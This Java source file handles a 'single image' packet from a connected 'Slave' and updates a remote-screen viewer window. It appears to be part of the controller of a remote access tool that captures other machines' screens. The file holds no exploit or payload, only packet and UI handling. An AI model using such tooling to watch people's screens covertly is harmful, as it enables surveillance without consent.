package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRemoteScreen;

public class PacketSINGLEIMAGECOMING extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {		
		PacketIMAGECOMING cl = new PacketIMAGECOMING();
		cl.requestAgain = false;
		cl.read(slave, dis);
		
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		if (frame != null) {
			frame.running = false;
			frame.btnRequestOne.setEnabled(true);
		}
	}

}
